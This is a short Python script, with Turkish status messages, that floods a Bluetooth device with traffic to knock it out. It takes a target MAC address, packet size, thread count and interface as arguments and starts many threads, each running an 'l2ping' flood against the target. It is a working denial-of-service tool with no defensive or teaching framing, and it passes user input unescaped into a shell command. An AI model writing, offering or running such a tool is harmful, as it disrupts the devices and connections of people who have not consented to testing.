import os
import threading
import time
import colorama
import sys
from colorama import Fore
colorama.init()
if len(sys.argv) < 5:
    sys.exit()

interface = sys.argv[4]
def DOS(target_addr, packages_size):
    try:
        os.system(f'l2ping -i {interface} -s ' + str(packages_size) +' -f ' + target_addr)
    except KeyboardInterrupt:
        print(Fore.RED+'[-]'+Fore.RESET+' Saldırı durduruldu, [CTRL+C]')
        sys.exit()

def main():
    target_addr = sys.argv[1]
    try:
        packages_size = int(sys.argv[2])
    except:
        print(Fore.RED+'[-]'+Fore.RESET+' Paketler boyutu bir tamsayı olmalı')
        exit(0)
    try:
        threads_count = int(sys.argv[3])
    except:
        print(Fore.RED+'[-]'+Fore.RESET+' Konu sayısı bir tamsayı olmalı')
        exit(0)
    print(Fore.BLUE+'[*]'+Fore.RESET+' MAC Adres Yoklaniyor...')
    time.sleep(0.3)
    print(Fore.BLUE+'[*]'+Fore.RESET+' Threads Başlatılıyor...')
    for i in range(0, threads_count):
        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

    print(Fore.BLUE+'[*]'+Fore.RESET+f' {target_addr} Saldırı başladı.')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print(Fore.RED+'[-]'+Fore.RESET+' İptal edildi')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print(Fore.RED+'[-] ERROR:'+Fore.RESET+' ' + str(e))
